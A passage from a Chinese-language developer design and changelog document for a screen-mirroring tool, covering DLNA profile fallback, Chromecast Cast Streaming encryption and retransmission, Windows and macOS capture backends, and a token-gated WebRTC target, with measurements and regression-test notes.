时代的电视不认），看门狗每 5 秒 `GetTransportInfo`，掉出 `PLAYING` 重投 URL，`RelTime` 在动才算活着。**v0.17 起"连续失败自动换下一档"是真的换，不再只是提示**（`_rotate_dlna_profile`）：一次运行最多 `DLNA_MAX_PROFILE_TRIES = len(DLNA_PROFILES) - 1` 档，每一步 = 重启编码器（比一次重投贵几秒），所以四条边界必须同时成立 —— a) **只在证据指向"容器被拒"时换**：`misses >= DLNA_MAX_REPUSHES`，或 `exchanges` 动了而 `written` 没动连续 `DLNA_MAX_REFUSALS` 次；b) **「伪装成文件」形状永不换档**（`session.bytelog` 为真直接 `return False`）—— 那里的失败是"电视拿一个伪造长度去尾部找不存在的索引"，换五个容器也换不出来，`_give_up` 早就在说换形状，换档会把那句话埋掉；c) **绝不写用户的选择**：阶梯只在实例上（`_profile_id` / `_profile_tries`），`start_mirror` 清空它，`Mirror_Dlna_Profile` 一个字节都不动 —— 所以页面上亮的档位（`dlna_profile_display()`，**由 renderer 回答**）与设置里存的**可以不一致**，而 `_run_mirror` 只**问一次**（`active_dlna_profile()` 的返回值同时交给 session 与 ffmpeg argv；两处各问一次就是"画面档位与 argv 档位分家"的来源，Part 23 有两条**纯文本**用例守着这一条，因为它们问的是"谁在什么地方问")；d) **换档前先增 generation 再 `_teardown()`**（本行末尾那条通用红线在这里同样成立），且 `_teardown` 必须同步做完，否则紧随其后的 `start_mirror` 会看见 `_starting` 还挂着而静默什么都不做 —— 一个停在第 2 档的阶梯比没有阶梯更糟。**放弃（`_give_up`）之后要 `_retire_session()`**：`_fail` 只把 `_mirroring` 关掉，此前没有任何东西去关 ffmpeg 与 HTTP 服务，于是页面读「未镜像」而采集其实还在跑。**默认档位随形状走**（`default_dlna_profile_id(shape)`）：直播形状 = `ts-h264`，伪装成文件 = `ps-pal`（那一档本来就是为 DVD 时代固件留的，而我们**没有**老电视可验）。理由是量出来的（同一台 Mac、同一接收端、同一编码器、20 秒 A/B 跑两轮）：`ps-pal` 首帧 5.86 秒 / 稳定 5.08，`ts-mpeg2` 首帧 2.47 / 稳定 2.15，而这两档载荷逐字节等价（同为 mpeg2video + AC-3、同 CBR、同 25 fps、同 720×576）—— **3.4 秒是容器要的，且开局晚就全程晚**（两边位置都以 1.00x 前进）。机制两条：`-preload` 给 vob 刻进 `start_time 0.534667`（`-preload 0` 是 0.034667，实测 5.86 → 5.30，**故意不发**：PS 的 VRV 模型靠这段交错余量活着，下溢会刷警告加花屏），以及 MPEG-PS 自我确认弱（`ffprobe probe_score` PS 26 / TS 100 ⇒ 接收端多留 1.1–1.4 秒探测缓存）。**`-muxrate` 是被证伪的第三个嫌疑**（明写 10080000、真实码率、20160k 三个都落在 as-shipped 上）。五档的数（`DLNA_PROFILE_LATENCY`）与它的**限定语**（`DLNA_PROFILE_LATENCY_SCOPE`：接收端是本机另一台 mpv/Macast，**不是真老电视**）一起显示在设置页「兼容档位」的 `title` 上，用例逐条比这两处文案 —— **表格与限定语必须同时出现**，只给数字就是把手边的接收端当成全世界的电视。**测试契约跟着 renderer 的脸走**：`console_state()` 问的是 renderer 的 `dlna_profile_display()`，所以每个假 renderer（`_FakeMirror22`、`_FakeMirror23`、Part 35 的 `types.SimpleNamespace`）都得有它，少一个就是一个 AttributeError 打断整个 Part。还有 Part 23 那台假电视多了一个 `refuse` 开关：**"取走地址却一个字节都不读"这一格必须由它把 `Play` 也答成 STOPPED** —— 我们的重投本身就会让一个配合的设备进 PLAYING，而假设备照默认动作回 PLAYING 时看门狗什么都不做是**正确行为**，用例却会把它读成"回退逻辑坏了"（它第一次写出来时的红法正是这个）。**发送端（我们）自己的 SOAP 也有一条红线**：`Content-Length` 必须按 **UTF-8 字节数**算，`len(str)` 会让带中文设备名的 DIDL 在局域网里被**截断**（电视回 SOAP Fault，症状是"电视没反应"而不是"我们发错了"）。发现侧：控制 URL 可能是相对路径，也可能是设备自称的另一地址/漏端口 —— 以**实际应答的地址+端口**为准（`parse_description` 里 `netloc` 而不是 `hostname`，端口用 `_port_suffix()` 兜非数字）。回归用例 **Part 23**：把**我们自己的 DLNA 接收端**（`protocol.DLNAProtocol().call()`）当最严格的 SOAP/DIDL 校验器用 —— 它真的 lxml 解析并解嵌 DIDL，所以"我们发的东西连自己都不认账"这类问题在打桩测试里也能被抓出来。**v0.6 的第二条 Chromecast 通道 = Cast Streaming（`caststream`，设置页里的「Chromecast 低延迟（实验 · 此通道无声音）」—— 它的提示必须同时说出"电视不认这一通道时自动回落兼容通道，那时是有声音的"**，否则用户第一次听到声音就会来报标签是假的：这一条正是这么来的）**：
      完全不走 HTTP、不发 `LOAD`、没有 SDP —— deviceauth → CONNECT → LAUNCH(`0F5096E8`) →
      `urn:x-cast:com.google.cast.webrtc` 上的 OFFER → ANSWER 给一个 UDP 端口 → UDP 上发
      RTP(12B) + Cast 头(7B)。红线全在这几条：① **`LAUNCH_ERROR` 就是能力探测**，收到就
      回落 `cast`/LOAD 通道，握手放在 ffmpeg 与 HTTP 服务**之前**，所以回落不需要拆摊子
      （`handed` 标志决定 sink 归谁，被 generation 打断时也要 `_cleanup(..., sink)`）；
      ② **加密走操作系统的原生 AES-128-CTR，纯 Python 只是最后的兜底**（2026-10 改；
      此前 ② 写的是"纯 Python ≈1.3 MB/s 才是码率天花板 4.5 Mbps"，那句在当时是真的，
      现在**整条作废**）。三个后端全部经 `ctypes`，**一个新依赖都没有** —— 这正是它能进
      第一批的原因：Part 30 的白名单、三处打包配置、`requirements/*.txt` 一个都不用动。
      darwin = CommonCrypto（`CCCryptorCreateWithMode` + **每帧 `CCCryptorReset`** + 一次
      `CCCryptorUpdate`）、nt = bcrypt（`ChainingModeCTR`）、其它 = libcrypto（`EVP_aes_128_ctr`）。
      四条被量过或被否掉的决定，改这里之前先读：
      **(a) 句柄按实例缓存、每帧只 `Reset` 不新建** —— `CCCryptorReset` 与新建一个 cryptor
      逐字节相同（frame id 0/1/2/3/7/255/256/65535/2³¹ 都验过），而这是 4,994 → 11,297 MB/s 的
      全部来源；`__del__` 里释放，释放失败要吞掉（解释器退出时库可能已经没了）。
      **(b) 一个访问单元只调一次 `Update`，绝不切块** —— 按 1,200 字节切会把 CommonCrypto
      打到 811 MB/s（ctypes 调用本身约 1.4 µs）。
      **(c) 两条退路是故意不做的**：Windows 上"每 16 字节调一次 `BCryptEncrypt` 拼 ECB 当 CTR"
      被否掉（一次调用比它要替代的那段 Python 密钥表还贵 ⇒ 那不是兜底，是戴着原生徽章的降级）；
      `libgcrypt.so.20` 从 Linux 链里删掉（一个没法测的第四后端是负债）。
      **(d) macOS 上绝不去探 libcrypto**：`ctypes.CDLL('libcrypto.dylib')` 按裸 soname 加载会
      **把解释器直接 abort 掉**（SIGABRT / 退出码 134），因为 CPython 自己已经载了一个不同版本的
      libcrypto，扁平命名空间下的符号冲突是致命的。
      另外 **每个后端的 `crypt` 都要有 `if not data: return b''`**：`ctypes.create_string_buffer(0)`
      给的是 1 字节缓冲、`.raw` 是 `b'\x00'`，空输入那条 KAT 会红。
      **上限从 4.5 提到 `CAST_STREAM_MAX_BITRATE = 8 Mbps`**（`CAST_STREAM_DEGRADED_BITRATE = 4.5`
      只在真降级时生效；`cast_stream_bitrate_cap()` 是唯一判定点，别在别处再写一个 4500000）。
      本机余量：按**真实链路形状**（复用句柄 + 每帧重算 counter block + 41,667 字节的访问单元）
      5,367 MB/s、每帧 7.8 µs，纯 Python 同负载 1.35 MB/s ⇒ 约 4000×。**别引用 11,297 MB/s
      那个数**：它是"只算加密、不算 `frame_iv` 与新建 IV 缓冲"的形状，好看但不是我们跑的那条路
      （这条错已经犯过一次，写进注释后被自己抓出来）。8 Mbps 本身是**我们选的数不是量出来的**：
      Google 自己的 `kDefaultVideoMaxBitRate` 是 10 Mbps、Chrome 标签页投屏默认 5 Mbps。
      后端**有名字**（`_NATIVE_AES = (name, make, crypt, release)`，`native_aes_name()` 读它）：
      三个闭包叫 make/crypt/release 时长得一模一样，"某个 OS 后端加载了"是日志/页面提示/用例
      能做出的最强陈述，而那不够用 —— 启动时跑一次 known-answer 自检（`_aes_known_answer`，
      四条向量含空输入），过了才认这个后端，然后把名字打进日志、页面提示和 `_quality_note()`。
      **一句必须留在文档里的诚实话**：KAT **永远区分不出**"只加低 64 位计数器"与"整个 128 位
      级联加"（那要 2⁶⁴ 个块才现形）。安全性靠的是 `frame_iv` 的布局（frame id 在字节 8..12、
      12..16 是零 ⇒ 每个访问单元 2³² 个块 = 68.7 GB 余量；要进位到固定的高半区需要
      `aesIvMask[8:16]` 落在距 2⁶⁴ 约 2,600 以内，每会话概率约 2⁻⁵¹）。**那条自检是"操作系统
      换了"的绊线，不是安全论证** —— 谁要把它当成后者的证据，就会在换平台时以为验过了；
      ③ 加密是**每帧一次**（per-frame nonce：frame_id 大端放 counter block 的字节 8..12 再
      XOR `aesIvMask`），**切片在加密之后**，反过来就解不开；④ **x264 `-tune zerolatency`
      会把一帧切成多个 slice（实测 720p 10 片）**，访问单元只能按 `first_mb_in_slice==0`
      （NAL 头后第一字节最高位，ue(v) 0）判起，一个 NAL 一帧 = 电视上永远只有 1/10 张图；
      ⑤ **`-aud` 是 AVOption 不是 ffmpeg 开关**，必须写 `-aud 1`，否则它把下一个选项当成
      自己的值吃掉（症状：`Unable to parse "aud" option value` 然后把参数串当输出文件名）；
      x264 参数名是 `min_keyint` 不是 `i-frame-min`，**写错只打一行 error 然后静默忽略**；
      ⑥ 媒体 socket **bind 但不 connect**（connected socket 会被内核丢掉电视从自己端口发的
      checkpoint），收 RTCP 按 `peer[0] == 电视 IP` 过滤；RTCP 长度字段 = **含 4 字节头的
      总字数 -1**（CAST 块 16 字节体 ⇒ 4，写 3 会永远读不到确认，在途窗口填满后一直丢帧）；
      ⑦ **在途窗口按时长算，不是按帧数**（2026-10 改）：`clamp(2 × RTT, MIN_WINDOW_MS=66 ms,
      TARGET_DELAY_MS/3)`，外加 `MAX_IN_FLIGHT_FRAMES = 120` 的硬顶防跑飞。原来那个固定
      **12 帧**在 24 fps 下是 **500 ms 的排队 = 协议自己那份 200 ms 预算的 7.6 倍**，
      也就是说"低延迟通道"的大部分延迟是排在自己队里。本机量出来的窗口：RTT ≤ 33 ms 时
      恒为 66.00 ms（≈1.58 帧），再往上升到 66.67 ms（= `TARGET_DELAY_MS/3`）后饱和 ——
      **两端只差 0.67 ms，所以在 200 ms 的目标延迟下这个窗口实际上是被钉住的**，RTT 探测
      只有在哪天把 `targetDelay` 调大时才真的起作用（这句话是说给读代码的人的：别以为
      自适应在工作，它现在只是"合法地待命"）。RTT 由 checkpoint 的往返做指数平滑
      （`RTT_SMOOTHING = 0.25`，`RTT_MAX_MS = 1000` 夹住）。窗口满就**丢整帧**并置
      `awaiting_key`，PLI 后只等 IDR，kickstart 只在空闲时重发最新未确认帧的最后一包。
      ⑧ **NACK 补发是真的补发**（2026-10 改）。此前本条写的是"**没有重传路径**（设计如此）"，
      那句是**错的**，错在把 openscreen 读成了"只检测丢包、不修复"—— 它的
      `cast/streaming/impl/sender_impl.cc:556 OnReceiverIsMissingPackets` 是一条完整的
      NACK 重传路径（含 staleness 判定与 `retransmitted_count`）。电视把 NACK 挂在
      checkpoint 的**同一个复合 RTCP 包**里（`CAST` 块之后），每条 4 字节
      `(frame8, packet_id_be16, bitmask)`：`bitmask == ALL_PACKETS_LOST (0xffff)` 表示整帧都丢
      且**位图不读**，否则第 i 位（LSB 起）补 `packet_id + 1 + i`
      （`compound_rtcp_parser.cc:507`）。四条红线，全部来自 openscreen 而不是试错：
      **(a) 帧号按 checkpoint 往前展宽** —— 用 `expand_frame_id_after(id8, anchor)`（严格大于），
      **不是** `expand_frame_id`（那是"至多到 latest"，会**倒退**：`expand_frame_id(5, 4) == -251`）。
      **(b) 太新的不补** —— `sent_at > arrived - RTT` 的包还没到该到的时候，补它只是在一条
      已经拥塞的链路上再灌一份（openscreen 的 staleness 规则），计入 `retransmit_stale`。
      **(c) 修复缓冲有上限** —— `RETRANSMIT_BUFFER_BYTES = 8 MiB`，超了就把**最老的**那帧
      换成只留元数据的空壳（`(frame_id, (), ts, sent_at, 0)`），此后再被点名就计入
      `retransmit_gone`。**丢的是副本不是账**，所以 `delivered` 不会因此少算。
      **(d) 一次反馈最多补 `MAX_RETRANSMIT_PER_FEEDBACK = 64` 包**，且**发送在锁外**
      （openscreen 用一个 router 做节流，我们**故意不转写节流**，改用这个上限把它夹住）。
      补发**复用原来的密文、只换 sequence**（`_restamped(packet, seq)`：改字节 2..4），
      所以线上不会出现两个相同序号；帧号与序号在 `_begin_frame` 里**一次拿完**（`_lock` 下），
      补发路径读同一把锁 —— 曾经两个分配器各自改 `_sequence`，会发出重复序号（已修，Part 24 钉住）。
      **`retransmits` 数的是补出去的包，不是 `socket_bytes - bytes`** —— 那两个计数器
      **没有固定大小关系**：`bytes` 在 `feed()` 里、在窗口判定**之前**就加了，所以它把被窗口
      丢掉的帧也算进去；`socket_bytes` 数的是数据报（每个比 payload 多 19 字节）外加补发与
      空闲探测。所以"丢帧的流 `bytes` 领先，不丢帧的流 `socket_bytes` 领先"，
      把这个差读成"补发流量"是**错了两次**（这条谎曾写在我们自己的 `stats()` 注释里）。
      页面上「往返时延 / 补发 / 未补发」三行由此而来（`mirror_view.py`，Part 39 守着），
      `未补发` 只在非零时出现，`往返时延` 在还没有任何确认时读「暂无」而不是 `0.0 毫秒`。
      teardown 顺序
      encoder → EOF → drain → CLOSE transport → STOP(sessionId) → CLOSE receiver-0，
      保活 PING 5 秒、20 秒无 PONG 判死并回调 `_stream_lost`。**这套字段全部是从 openscreen
      转写来的，没有任何一条见过真电视**（Part 24 的假设备与发送端共用同一张表，只能证明自洽，
      见 §4.9）；真机验证 = `scripts/cast_streaming_probe.py`。回归用例 **Part 24**：
      OFFER/ANSWER 形状、AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头、切片与序号回绕、
      SR/NTP、`parse_rtcp`（PLI/checkpoint/nack/CST2/复合包）、8 位帧号扩展、多 slice 访问单元、
      真 sockets 上打完整个握手并对打到丢帧窗口、**NACK 补发（补回来的包换了序号、payload
      逐字节相同、线上没有重复序号）**与回落路径。**注意"一帧的 fixture"测不出补发**：
      `_on_rtcp` 先按 checkpoint 把 `<= anchor` 的在途项弹掉、再去读同一个包里的 NACK 字段，
      所以只发一帧再确认它 = 已经没有任何东西可补，那样写出来的用例第一次是**因为错误的原因
      通过**，之后就静默地什么都不测了（下面每条补发用例都发两帧、点名第二帧）。**v0.20：Windows 采集先问 ddagrab，gdigrab 降为运行时回落**（2026-10-02 在一台真 Windows 11 / build 26300 / ffmpeg 8.1.2 上量出根因）：gdigrab 抓的是**整块虚拟桌面**，那台机器上 4000×2571 —— **奇数高度**，x264 直接 `height not divisible by 2 (4000x2571)`、**原始分辨率档零字节产出**；ddagrab（Desktop Duplication）**每块 DXGI 输出按自己的尺寸采**（同机 0/1 号各 attach 出 2560×1440，2 号连 attach 都被拒 —— 逐字 `Failed to enumerate DXGI output 2`），所以输出表按 `range(DDAGRAB_MAX_OUTPUTS)` 逐个问、**在第一次拒绝处停下**（结果缓存进 `_ddagrab_cache`，`invalidate_capture_cache()` 清它、**不清**进程生命期的 `_ddagrab_refused` 闩），屏幕选择器 v0.20 起按输出索引提供、以实测尺寸作标签。**attach 过 ≠ 会话能跑**：运行时被桌面拒绝（进程早死 + stderr 认得出，`_DDAGRAB_FAILURE` 认 ffmpeg 自己的话）时警告一次（原因进 `ScreenMirror.log`，设置页「日志」可看）、本次运行闩住 ddagrab、重试一次 gdigrab，**系统声音仍按原设置一起采**；这条重试由 starter 独占判决 —— pump 对 `method == 'ddagrab' and not produced` 只记日志不上报（否则慢机上先报一次假「启动失败」），starter 的等待**认进程已死**（`proc.poll() is not None`）不把重试耗进整个无帧预算，`video_only_capture()` 弃声时**保留 `method`**（弃声后的 ddagrab 会话仍是 ddagrab）。真机验收：同机生产 argv（browser 目标）产出 **4,176,319 字节** fMP4，ffprobe 全量解出 h264 Constrained Baseline 2560×1440 / `r_frame_rate 24/1` / 93 帧 / 4.021 秒 / AAC 干净解码；**未验证**：真电视接收（本局域网没有 Chromecast）、第二块屏的实际投屏（只验到 attach 与生产编码）。同趟排掉一个疑点：`frag_every_frame`（v0.19 起）在 ffmpeg 8.x/9.x 上每秒约 90 条 `Packet duration: -N / dts out of range` + `pts has no value` 的 muxer 警告（macOS 合成源可复现、`frag_keyframe` 为 0、输出流逐帧可解长度正确）—— 是 muxer 噪声不是流坏了，且**到不了用户眼前**（`_drain_stderr` 按 debug 记、插件 logger 是 INFO），只记录不改代码。回归用例 **Part 54**（19 条：attach 解析三态、输出表五态、闩、回落 + 声音合并、屏幕号选中与落空、starter 快退与 pump 让位；8 个定点变异体共红 15 条且各自只在自己那句话上变红 —— 删快退判定 1、pump 提前上报 1、闩失忆 3、失败正则失明 3、探测不清 attach 缓存 1、屏幕号被忽略 2、第一次拒绝后不停 3、弃声丢 method 1；02/03/04 各自连带 2 条是因为多条用例共用同一条流）。**v0.21：macOS 13+ 先问 ScreenCaptureKit，avfoundation 降为回落路径**（2026-10-02；本机真实桌面，spawn→首帧中位 **600 对 1048 毫秒**、各三次跑，约省 450 毫秒/会话）：`_probe_screencapturekit` 问两件事 —— 系统版本够不够 13，以及这个 Python 环境 `import ScreenCaptureKit` 得不得（两个 pyobjc 发行包）；两问都过才以 SCK 为首选，否则整条路与从前逐字相同。**采集经两个管道**：视频是 NV12 帧经 stdin 喂 ffmpeg（`-f rawvideo -pix_fmt nv12 -s WxH -framerate 24 -use_wallclock_as_timestamps 1 -i -`），系统声音是独立 fd 上的 `-f f32le -ar 48000 -ac 2 -i pipe:<fd>`。四条管道事实（`scripts/sck_pipe_probe.py` 量出；`scripts/sck_capture_probe.py` 是它的可行性上游）：`-use_wallclock_as_timestamps 1` 配上原有的 `-r FPS` 才盖住 CFR（不加时 65 帧按 43 毫秒节奏只 mux 出 2.708 秒、漂约 87 毫秒）；**开着却静默的 f32le 管道会把整条命令冻在 open 上**（静止桌面不是这种 —— SCK 每 20 毫秒送整幅零 PCM；零音频加 EOF 也不冻任何东西，179,540 对 179,352 字节）；所以**弃声 = 关写端，不是重启采集**；CMSampleBuffer 回调返回即回收，不多持有。**首帧预算是 2 秒**（`SCK_FIRST_FRAME_SECONDS` —— 授权被拒时它什么都不产出，要在无帧看门狗那 3 秒之前先问出来），超时只记一条 `ScreenCaptureKit gave no frame (...)` warning 然后自动回落重试 avfoundation；`_sck_refused` 闩在**那个 ffmpeg 二进制**上、`invalidate_capture_cache()` **不清它**（改指针/换屏不是"SCK 又能用了"的新证据），所以一次拒绝只花一次尝试、本次运行不再问 SCK。音频另有 2 秒宽限（`SCK_AUDIO_GRACE_SECONDS`），等不到就单向弃声（`_audio_dropped` + `_audio_refused` 都置位，重建的采集仍保留 method、屏幕与规格），`audio_setup_needed()` 对 SCK 直接答"不需要" —— SCK 的音频 tap 不经过任何音频设备，BlackHole / 聚合设备 / 麦克风权限与它无关，弃声后还劝用户一键设置就是让他走一遍"装了什么都不会变"的安装器。**授权是同一道门**：SCK 也要屏幕录制授权；`CGPreflightScreenCaptureAccess`（ctypes 直载 CoreGraphics、只问不弹 —— 后台线程答不了授权弹窗）过了才试，没过静默落 avfoundation。**打包三处 + 一处运行时兜底**：`pyobjc-framework-ScreenCaptureKit` 与 `pyobjc-framework-CoreMedia` 进 `requirements/darwin.txt`、`setup_py2app.py` 的 includes（`ScreenCaptureKit` / `CoreMedia` 在函数内 import，提到模块顶层会毒掉 Windows/Linux 加载）、macOS job 的 pip 列表；缺任一处产物会**静默**退回 avfoundation（惰性 import 的代价与理由写在 requirements/darwin.txt 的注释里）。回归用例 **Part 55**（40 条，绿跑）：管道 argv 逐字、四条管道事实的形状、2 秒预算与单次回落、`_sck_refused` 的清与不清、弃声单向性、音频 tap 与一键设置的脱钩、权限预检只问不弹、以及 `setup_py2app.py` 的 includes 里那两个包（声明面那两处由 Part 30 自动覆盖，这一处没有人推着）。八个定点变异体各自变红 13/2/4/1/12/4/2/1 条，每个跑完整套件、还原后逐字节校验。**v0.22：第五种目标 WebRTC —— 浏览器直连，链路里没有播放器那一层缓冲**（2026-10-02；本机真浏览器两轮验收通过，见 §6 的 `webrtc_page_probe.py`）：页面里开一个真正的 `RTCPeerConnection`，编码器吐出的 Annex-B H.264 按访问单元切好、**零重编码**装进 RTP 走 SRTP（aiortc 的 `pack()` 只做 NAL 拆分与 FU-A/STAP-A 打包、不碰 CodecContext —— 这条形状的 `['-f','h264','pipe:1']` 就是"把 NAL 交给接收方去打包"，不是容器）。选型在 #89 判定过：ffmpeg 自带的 `-f whip` 是"推给媒体服务器"的出口（还要 8.0+、`AVFMT_EXPERIMENTAL`、H.264 baseline + Opus only），服务不了"局域网里页面直连、信令就走自家 HTTP、无 ICE 服务器"这条需求 —— 所以用 aiortc：**零系统依赖、两个可选 pip 包**（aiortc、av），这两个包就是这条目标的全部新增代价，也是打包四处与 Part 30/Part 56/D 的全部工作量。**信令只有三扇门、全在本机 HTTP 上、每扇只认本会话的 `page_token`**（`hmac.compare_digest`）：`GET /webrtc?token=` 给页面、`POST /webrtc/session` 换 offer、`POST /webrtc/answer` 交回 answer；管理令牌 `Api_Token` 与别的会话的 token 一律 403，answer 正文上限 `WEBRTC_MAX_ANSWER_BYTES = 256 KiB` 在**读第一个字节之前**拒绝（`Content-Length` 本身成为攻击面时就拒它）。peer **先注册再生成 SDP**（ICE 收集期间产出的单元已经排进它的队列，没有丢观看者窗口），`WEBRTC_MAX_VIEWERS = 4` 超额时点名拒绝而不是悄悄饿死已有观看端，`WEBRTC_PEER_TIMEOUT = 30 秒` 回收半协商的 peer，ICE 收集上限 `WEBRTC_GATHER_TIMEOUT = 2 秒`（LAN 上 host candidates 就是全部故事；这个上限是防"VPN 接口把页面首次绘制扣住"）。**这条目标最贵的 bug 是一次静默的 VP8 协商**（spike 期真发生过，Part 56/B 的 `'VP8' not in sdp` 就是钉它的）：aiortc 的 H264 capability 里 `packetization-mode` 的值是**字符串 `"1"`**，第一版过滤器写 `== 1`（int）一个都没匹配上，而 `setCodecPreferences([])` 在 aiortc 里表示"没有偏好" ⇒ offer 以 VP8 打头 ⇒ 协商成 VP8、`Vp8Encoder.pack` 把 H.264 字节套进 VP8 描述符里照发不误 ⇒ 观看端**零帧且无任何报错**（只有没人看的 codec stat）；修法是 `str(codec.parameters.get('packetization-mode')) == '1'`，外加"这个构建没有 H264 pt=1 时**响亮拒绝**"（`raise RuntimeError`）—— 沉默地继续就是上面那个黑画面。**gop 的 0.5 秒在这一路上又换了一次含义**：接收侧没有编码器可以响应 PLI，所以 `gop_size('webrtc') = FPS // 2 = 12` **就是**丢包后的恢复延迟、也是画中间加入的观看端等第一张完整图的时间（全秒数是"每丢一次就糊一秒"）。队列同样按 0.5 秒的**访问单元**预算（`WEBRTC_QUEUE_UNITS = FPS // 2`），满了丢整单元并置 `awaiting_key` 等下一个 IDR —— 真验收里握手期新观看端丢 134–138 个单元是**设计如此**（浏览器从 offer 到 SRTP 通要一两秒，期间队列按秒数滚动）。`exchanges` 计数只认 `/stream/` 与 `/browser` 两条路径（**按路径不按结果** —— 被拒的 404 探针也计 1），`/webrtc` 页面与三个信令端点、`/browser/stats` **一概不计**，否则一次观看会往「统计信息」的交换日志里灌一堆 HTTP。**打包四处一处不能少，且各有各的坑**（照 §4.4 的规矩各来一遍）：`requirements/common.txt` 与 `requirements/darwin.txt` 都点名这两个包（cheroot 那条原则）；`setup_py2app.py` 把 **`av` 放进 `packages`** —— 它的 wheel 是 delocated bundle（`av/_core.abi3.so` 经 `@loader_path/.dylibs/*.dylib` 链 FFmpeg），必须**整目录逐字节拷贝**让每条 `@loader_path` 原样解析，交给 modulegraph 拆散 + macholib 搬家就是 §4.3 那出"能构建、起不来"（而且 **`av` 只写 `packages` 一处**，同时写进 `includes` 会装两份）；`aiortc` 与 **`cffi`** 进 `includes` —— `cffi` 是那个**没有任何 Python 代码 import 它**的依赖：pylibsrtp 的 `_binding.abi3.so` 是 cffi API-mode 扩展，dlopen 时点名要 `_cffi_backend`，modulegraph 看不见（**第一次真构建的 .app 就死在 `ModuleNotFoundError: No module named '_cffi_backend'`**），而点名 `cffi` 就够 —— `cffi.api` 会做真正的 `import _cffi_backend`；三个 PyInstaller job 各加 `--hidden-import=aiortc --hidden-import=av --hidden-import=cffi` 并在 pip 列表里装两个包（`av` 自己的 lib 布局由 hooks-contrib 的 hook-av.py 处理，cffi 链要自己命名）。**［P9 更正，2026-10-04：这四处里只剩 requirements 那两个文件还点名它们；另外两处（py2app 的 `packages`/`includes`、三个 PyInstaller job 的 `--hidden-import` 与 pip 列表）已经反向 —— 默认产物不再携带这条链，改为随 Release 发布的 extras zip 由应用内一键安装，见 §4.15。下面那段「本机真构建逐项查过」记的是当时那个 .app，作为证据仍然成立，但它不再是「要维持的状态」。］** **本机真构建逐项查过**：`lib/python3.12/av/.dylibs/` 是逐字节副本（libavcodec 62 / libavformat 62 等一应具全）、`aiortc/` 在 `lib/python312.zip` 里、`cffi/` 是实体目录且 `_cffi_backend.so` 落在 `lib-dynload/`。**验收手法两条要记住**：① `scripts/webrtc_page_probe.py` 是这条目标的端到端检查（见 §6 脚本表）：它驱动缓存的 chrome-headless-shell、用**标准库手搓的最小 CDP 客户端**（RFC6455 从零写，客户端帧必须 masked），因为 `--timeout` 是加载上限不是等待（实测 0.302 秒就 dump）、CLI 点不了「统计」按钮；② **`auto` 编码器的老行为在这条目标上第一次显形**：`encoder_kind('auto')` 只读**已缓存**的探测答案、从不 spawn（见本行上方），而验收脚本走 API-only start（没人读过 console/`mirror-state`、没人赞助 `request_probes()`）⇒ 探测缓存空 ⇒ 一台有 VideoToolbox 的 Mac 落在 software；先 `GET /api?query=mirror-state` 暖探针再 stop/start，第二轮即落 `hardware` —— **这是设计，不是 bug**，但复现验收时必须先暖一遍。回归用例 **Part 56**（**2026-10-04 实测执行 56 条**：A 段 argv 与 gop 7、B 段三扇门 + 全部拒绝形状 + 失败不缓存 + `'VP8' not in sdp` 29、C 段**真 aiortc 客户端**过真门、解真 fixture 的 SRTP 帧且 pts 确定性 `k * 90000/FPS` 4、D 段打包面 AST 16。这里原先写的是 47 条 —— 那是 v0.22 落地那一次的数，之后 Part 56/B 的「观察时机」（§4.2 末条）与 Part 56/D 的打包面（P9 的翻面 + v0.21 的转发库两条）都往里加过用例而没人回来改这个数字。**记在这里是因为它正是 §4.13 那条规矩的反面**：一个抄自计划、冻结在第一次测量上的数，读起来和测量一样权威），四个定点变异体各自变红 5/2/2/1 条（`str(...)=='1'` 改回 `==1` 但保留拒绝 / 改回 `==1` 并删掉拒绝 = 原始静默 bug（B㉖ SDP 里 VP8 + C③ 零帧）/ 管道封装 h264 改 mpegts（A③+A⑤）/ common.txt 删 aiortc），全部从 /tmp 备份还原、md5 逐字节一致（**绝不用 git restore**）。真浏览器两轮验收（software x264 与 hardware VideoToolbox）**全 PASS**：协商 codec `video/H264 pt=99`、解码 24 fps / 上屏 23–25 fps、探针自装的 rVFC 计数器与页面 Q 互为双见证（59/61）、canvas 抓帧亮度非均匀（真画面不是全黑）、页面 `live` 与探针直取 `/browser/stats` 逐格一致（clients=1、sent>0）、浏览器关闭后 clients 回 0、三档宽度 2× 截图。**诚实边界（v0.23 更正）**：v0.22 那两轮验收是本机浏览器对打，但**跨机器这一半在 2026-10-02 补上了** —— Windows 192.168.1.68 采集、Mac 上真浏览器观看，browser 与 webrtc 两种形状都跑通（下面 v0.23 段）。**仍未验**：Safari / 手机 / 真无线链路。webrtc 的**端到端 lag 数字**在 2026-10-03 补上了本机这一半（`/webrtc` 与 `/browser` 同一个闪光仪器：屏幕到屏幕 369 毫秒对 492 毫秒，见本节末 v0.25 段与研究文档 §10），**跨机器那一半仍待**。**v0.23：Windows→Mac 的性能取证落在四处（2026-10-02/03，用户报"windows 电脑投屏到 macOS 性能还是不行"）**：取证是 spike-B/C 在真跨机链路上做的（.68 ddagrab 采集 → 本机浏览器观看，browser/MSE 与 webrtc 两条），四条改动都来自量到的数字而不是猜测。**① 浏览器队列按"这个容器排队的最小单位"定深**（`live_queue_units()`）：`LIVE_QUEUE_SECONDS` 是**一个**秒预算、**三种**单位 —— 不分帧的 TS/PS 排 4 KiB 读块（`live_queue_chunks`，夹 64–256）、分片 MP4 排**整个片段**、直播 Matroska 排整个 Cluster（`MKV_CLUSTER_BYTES`）。这一档以前按**字节**预算算完再夹在 64–256 里，v0.19 分帧之后"256 块"落到真容量 **8 个片段 = 0.11 秒**（预算要 0.75 秒）——**慢消费者还没开始慢，队列自己已经把帧丢了，实测 28% 自丢**。更细的一层：`frag_every_frame` 是**按 sample** 不是按画面，音频在同一次 flush 里复用，所以 24 fps 带声音一秒写 **24 + 46.875 ≈ 70.9 个 `moof`**（真会话量的：15.02 秒 1063 片 = 70.8 片/秒、平均 8,835 字节，`fragment_rate()` 的 docstring 就写着这行数）；按 `FPS` 报价只买回三分之一，按写死的 8 报价只买回六分之一。现在 fMP4 档 = **54 个片段**，且队列的单位与分发器分片依据（`init_marker`）**读同一个值**、一起决定。**② 深度与"没有可播起点"都要看得见**：`queue_hold_seconds()` 是同一套算术的反函数（分帧单位除节奏、字节单位除码率；没有码率就答 `None`，绝不编一个数），卡片「发送队列（延迟来源）」= `x.xx 秒 · N 块`、浮层「发送端队列」同源；`keyframe_misses` 经 `live.misses` 上两处（非零才出现，「重播等关键帧 N 次」），回答的是"这个观看端为什么黑了一下"——它涨 = 尾部确实没有 IDR 开头的片段，它不涨而仍卡 = 看「发送端丢块」。**③ MSE 的 fourcc 从线上读，不再写死**：`avc_codec_of()` 解 init segment（`moov`→`avcC` 